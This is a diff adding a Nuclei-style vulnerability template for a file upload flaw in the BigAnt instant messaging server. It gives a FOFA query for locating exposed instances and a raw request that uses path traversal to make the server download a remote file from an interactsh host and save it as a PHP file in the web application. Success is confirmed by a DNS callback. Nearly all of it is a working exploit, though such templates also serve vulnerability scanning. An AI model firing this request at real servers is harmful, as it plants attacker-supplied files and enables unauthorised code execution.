@@ -1,0 +1,27 @@
+id: damayi-dispersed-orgupload_file-wen-jian-shang-chuan-lou-dong
+
+info:
+  name: "大蚂蚁即时通讯系统 DispersedOrg 接口文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="BigAnt-Admin"
+    GET /Application/DudeSuite.php HTTP/1.1
+  tags: 大蚂蚁即时通讯系统
+
+http:
+- raw:
+  - |
+    GET /api/DispersedOrg/upload_file?server_id=1&path=/data/../Application/Ntest.php&file_url=http://{{interactsh-url}}/1.php HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+    Accept: */*
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: interactsh_protocol
+    words:
+      - "dns"
